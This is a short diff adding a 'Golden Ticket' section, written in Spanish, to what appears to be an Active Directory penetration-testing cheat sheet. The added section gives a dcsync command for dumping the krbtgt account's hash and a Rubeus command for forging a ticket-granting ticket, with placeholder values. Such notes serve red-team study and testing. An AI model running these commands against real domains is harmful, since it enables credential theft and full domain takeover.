@@ -645,6 +645,15 @@ psexec        | HOST & CIFS
 winrm         | HOST & CIFS
 dcsync        | LDAP
 
+## Golden Ticket (TGT)
+Coger el hash NTLM o AES de krbtgt
+```
+dcsync DOMINIO DOMINIO\krbtgt
+```
+Hacer el TGT
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:AES_KRBTGT /user:USUARIO /domain:DOMAIN.local /sid:DOMAIN_SID /nowrap
+```
 # Forest & Domain Trusts
 ## Parent/Child
 Enumerar Dominios
